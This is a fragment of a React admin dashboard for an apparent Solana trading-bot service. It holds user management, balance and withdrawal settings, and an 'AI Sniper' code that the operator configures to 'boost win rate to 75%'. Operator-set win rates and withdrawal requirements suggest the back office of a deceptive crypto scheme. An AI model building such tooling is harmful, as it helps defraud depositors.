                                    <span className="px-3 py-1 bg-purple-900/30 text-purple-400 text-xs rounded-full">
                                      TurboCharge Code: {wallet.speedBoostCode}
                                    </span>
                                  )}
                                  {wallet.speedBoostEnabled && (
                                    <span className="px-3 py-1 bg-green-900/30 text-green-400 text-xs rounded-full flex items-center gap-1">
                                      <Rocket className="w-3 h-3" />
                                      TurboCharge Active
                                    </span>
                                  )}
                                </div>

                                {/* Action Buttons */}
                                <div className="flex gap-3">
                                  <Button
                                    onClick={() => handleEditWallet(wallet)}
                                    className="bg-purple-600 hover:bg-purple-700 text-white"
                                  >
                                    <Edit2 className="w-4 h-4 mr-2" />
                                    Edit User
                                  </Button>
                                  <Button
                                    onClick={() => handleDeleteWallet(wallet.id)}
                                    variant="outline"
                                    className="border-red-500/30 text-red-400 hover:bg-red-900/20 bg-transparent"
                                  >
                                    <Trash2 className="w-4 h-4 mr-2" />
                                    Delete
                                  </Button>
                                </div>
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    ))
                  )}
                </div>
              </div>
            )}

            {/* Settings Tab */}
            {activeTab === "settings" && (
              <div className="space-y-6">
                {/* Balance Requirements */}
                <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-6">
                  <div className="flex items-center gap-3 mb-6">
                    <div className="w-12 h-12 bg-purple-900/30 border border-purple-500/30 rounded-xl flex items-center justify-center">
                      <Settings className="w-6 h-6 text-purple-400" />
                    </div>
                    <div>
                      <h2 className="text-xl font-bold text-white">Balance Requirements</h2>
                      <p className="text-gray-400 text-sm">Configure global balance settings</p>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
                    <div>
                      <label className="block text-sm font-medium text-gray-300 mb-2">Minimum Balance (SOL)</label>
                      <input
                        type="number"
                        step="0.01"
                        name="minBalance"
                        value={newBalanceRequirements.minBalance}
                        onChange={handleBalanceRequirementChange}
                        className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-300 mb-2">Maximum Balance (SOL)</label>
                      <input
                        type="number"
                        step="0.01"
                        name="maxBalance"
                        value={newBalanceRequirements.maxBalance}
                        onChange={handleBalanceRequirementChange}
                        className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-300 mb-2">SOL to USD Rate</label>
                      <input
                        type="number"
                        step="0.01"
                        name="solToUsdRate"
                        value={newBalanceRequirements.solToUsdRate}
                        onChange={handleBalanceRequirementChange}
                        className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-300 mb-2">Minimum Deposit (SOL)</label>
                      <input
                        type="number"
                        step="0.01"
                        name="minDeposit"
                        value={newBalanceRequirements.minDeposit}
                        onChange={handleBalanceRequirementChange}
                        className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-300 mb-2">Minimum Withdrawal (SOL)</label>
                      <input
                        type="number"
                        step="0.01"
                        name="minWithdrawal"
                        value={newBalanceRequirements.minWithdrawal}
                        onChange={handleBalanceRequirementChange}
                        className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-300 mb-2">Withdrawal % Requirement</label>
                      <input
                        type="number"
                        step="1"
                        name="withdrawalPercentage"
                        value={newBalanceRequirements.withdrawalPercentage}
                        onChange={handleBalanceRequirementChange}
                        className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                      />
                    </div>
                  </div>

                  <div className="p-4 bg-purple-900/20 border border-purple-500/30 rounded-lg mb-6">
                    <label className="flex items-center justify-between cursor-pointer">
                      <div>
                        <p className="text-white font-medium">Require Minimum Balance on Reconnect</p>
                        <p className="text-gray-400 text-sm mt-1">Users must meet min balance when reconnecting wallet</p>
                      </div>
                      <input
                        type="checkbox"
                        checked={newBalanceRequirements.requireMinBalanceOnReconnect}
                        onChange={(e) => setNewBalanceRequirements(prev => ({ ...prev, requireMinBalanceOnReconnect: e.target.checked }))}
                        className="w-5 h-5"
                      />
                    </label>
                  </div>

                  <Button
                    onClick={handleSaveBalanceRequirements}
                    className="bg-gradient-to-r from-purple-600 to-purple-600 hover:from-purple-700 hover:to-purple-700 text-white"
                  >
                    <Save className="w-4 h-4 mr-2" />
                    Save Requirements
                  </Button>
                </div>

                {/* AI Sniper Config Code */}
                <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-6">
                  <div className="flex items-center gap-3 mb-6">
                    <div className="w-12 h-12 bg-purple-900/30 border border-purple-500/30 rounded-xl flex items-center justify-center">
                      <Brain className="w-6 h-6 text-purple-400" />
                    </div>
                    <div>
                      <h2 className="text-xl font-bold text-white">AI Sniper Configuration Code</h2>
                      <p className="text-gray-400 text-sm">Code users enter to boost win rate to 75%</p>
                    </div>
                  </div>

                  <div className="flex gap-4 items-end">
                    <div className="flex-1">
                      <label className="block text-sm text-gray-300 mb-2">Configuration Code</label>
                      <input
                        type="text"
                        value={newConfigCode}
                        onChange={(e) => setNewConfigCode(e.target.value)}
                        className="w-full bg-black border border-purple-500/30 rounded-lg px-4 py-3 text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                        placeholder="Enter code (e.g., BOOST75)"
                      />
                      <p className="text-gray-500 text-xs mt-1">Current code: {aiSniperConfigCode}</p>
                    </div>
                    <Button onClick={handleSaveConfigCode} className="bg-purple-600 hover:bg-purple-700 text-white">
                      <Save className="w-4 h-4 mr-2" />
                      Save
                    </Button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </main>
      </div>
    </div>
  )
}